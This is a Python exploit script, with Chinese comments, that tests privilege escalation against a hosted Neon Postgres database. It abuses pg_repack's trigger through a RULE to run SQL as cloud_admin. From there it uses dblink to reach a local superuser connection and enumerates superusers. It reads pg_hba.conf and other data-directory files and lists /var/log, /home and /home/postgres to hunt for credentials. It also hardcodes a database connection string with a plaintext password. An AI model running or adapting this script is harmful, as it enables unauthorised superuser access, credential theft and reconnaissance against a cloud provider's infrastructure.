# -*- coding: utf-8 -*-
"""v13:抬级验证——
A) C 语言扩展函数(dblink)在 cloud_admin 上下文是否被补丁拦截(RULE 载体)
   若放行 + 本地 5432 trust → cloud_admin 真 superuser 直连(能力全集)
B) signal 文件/compute_ctl_temp_override.conf 内容
C) 日志/凭据侦察(/var/log /home/postgres .ssh 等)
D) pg_hba 单参全文
安全:dblink 直连后只 SELECT,零修改"""
import psycopg

URI = 'postgresql://neondb_owner:npg_cI5ynlaAqjU2@ep-crimson-fog-w2gucld1.us-east-2.aws.neon.build/neondb'
conn = psycopg.connect(URI, connect_timeout=20)
conn.autocommit = True
cur = conn.cursor()

def q(sql, fetch=True):
    try:
        cur.execute(sql)
        return cur.fetchall() if fetch else 'OK'
    except Exception as e:
        return 'ERR: %s' % str(e)[:400]

q("CREATE EXTENSION IF NOT EXISTS dblink", fetch=False)
q("CREATE EXTENSION IF NOT EXISTS pg_repack", fetch=False)
q("DROP TABLE IF EXISTS k_src", fetch=False)
q("DROP TABLE IF EXISTS k_out", fetch=False)
q("CREATE TABLE k_src(id int)", fetch=False)
q("CREATE TABLE k_out(x text)", fetch=False)
oid = q("SELECT 'k_src'::regclass::oid")[0][0]
q("DROP TYPE IF EXISTS repack.pk_%d CASCADE" % oid, fetch=False)
q("CREATE TYPE repack.pk_%d AS (id int)" % oid, fetch=False)
q("DROP TABLE IF EXISTS repack.log_%d" % oid, fetch=False)
q("CREATE TABLE repack.log_%d (pk repack.pk_%d, row k_src)" % (oid, oid), fetch=False)
q("CREATE TRIGGER t2 AFTER INSERT ON k_src FOR EACH ROW EXECUTE FUNCTION repack.repack_trigger('id')", fetch=False)

def set_rule(expr):
    q("DROP RULE IF EXISTS r_x ON repack.log_%d" % oid, fetch=False)
    q("CREATE RULE r_x AS ON INSERT TO repack.log_%d DO ALSO %s" % (oid, expr), fetch=False)
    q("TRUNCATE k_out", fetch=False)

def fire():
    return q("INSERT INTO k_src VALUES (1)", fetch=False)

# ============ A) dblink 在 cloud_admin 上下文 ============
print('=== A) dblink C 函数 definer 上下文 ===')
# A1:RULE 里 dblink_connect(cloud_admin 上下文)
set_rule("INSERT INTO k_out(x) SELECT dblink_connect('k2', 'host=127.0.0.1 port=5432 user=cloud_admin password=x dbname=postgres connect_timeout=5')::text")
r = fire()
print('A1 connect in RULE:', r, q("SELECT x FROM k_out"))
# A2:若连上 → 查身份(只读)
if not (isinstance(r, str) and r.startswith('ERR')):
    set_rule("INSERT INTO k_out(x) SELECT * FROM dblink('k2', 'SELECT current_user::text, session_user::text, (SELECT rolsuper FROM pg_roles WHERE rolname=current_user)::text') AS t(u text, s text, sup text)")
    r2 = fire()
    print('A2 identity:', q("SELECT x FROM k_out"))
    # 直连能力探测:读 postgres 库 pg_authid 角色数(只读)
    set_rule("INSERT INTO k_out(x) SELECT * FROM dblink('k2', 'SELECT count(*)::text FROM pg_roles') AS t(c text)")
    fire()
    print('A3 pg_roles count:', q("SELECT x FROM k_out"))
    set_rule("INSERT INTO k_out(x) SELECT * FROM dblink('k2', 'SELECT rolname::text FROM pg_roles WHERE rolsuper LIMIT 5') AS t(r text)")
    fire()
    print('A4 superusers:', q("SELECT x FROM k_out"))

# ============ B) signal 文件内容 ============
print('=== B) signal/override 文件 ===')
for f in ('zenith.signal', 'neon.signal', 'compute_ctl_temp_override.conf', 'neon.relsizes'):
    set_rule("pg_read_file(current_setting('data_directory') || '/%s')" % f)
    fire()
    t = q("SELECT x FROM k_out WHERE x IS NOT NULL")
    print('  %s: %r' % (f, (t[0][0][:300] if t else None)))

# ============ C) 日志/凭据侦察 ============
print('=== C) 日志与 home 侦察 ===')
for d in ('/var/log', '/home', '/var/db', '/var/lib/postgresql'):
    set_rule("INSERT INTO k_out(x) SELECT d FROM pg_ls_dir('%s') d" % d)
    fire()
    t = q("SELECT x FROM k_out WHERE x IS NOT NULL")
    print('  %s: %s' % (d, t if t else None))

# /home/postgres 深列 + .ssh
set_rule("INSERT INTO k_out(x) SELECT d FROM pg_ls_dir('/home/postgres') d")
fire()
t = q("SELECT x FROM k_out WHERE x IS NOT NULL")
print('  /home/postgres: %s' % (t if t else None))

# ============ D) pg_hba 单参全文 ============
print('=== D) pg_hba 单参全文 ===')
set_rule("pg_read_file(current_setting('data_directory') || '/pg_hba.conf')")
fire()
t = q("SELECT x FROM k_out WHERE x IS NOT NULL")
print(t[0][0] if t else 'no rows')

# 清理
q("DROP RULE IF EXISTS r_x ON repack.log_%d" % oid, fetch=False)
q("DROP TRIGGER IF EXISTS t2 ON k_src", fetch=False)
q("DROP TABLE IF EXISTS repack.log_%d" % oid, fetch=False)
q("DROP TABLE IF EXISTS k_src", fetch=False)
q("DROP TABLE IF EXISTS k_out", fetch=False)
q("DROP TYPE IF EXISTS repack.pk_%d CASCADE" % oid, fetch=False)
q("DROP EXTENSION IF EXISTS pg_repack", fetch=False)
q("DROP EXTENSION IF EXISTS dblink", fetch=False)
print('[final]:', q("SELECT tablename FROM pg_tables WHERE schemaname IN ('public','repack')"))
conn.close()
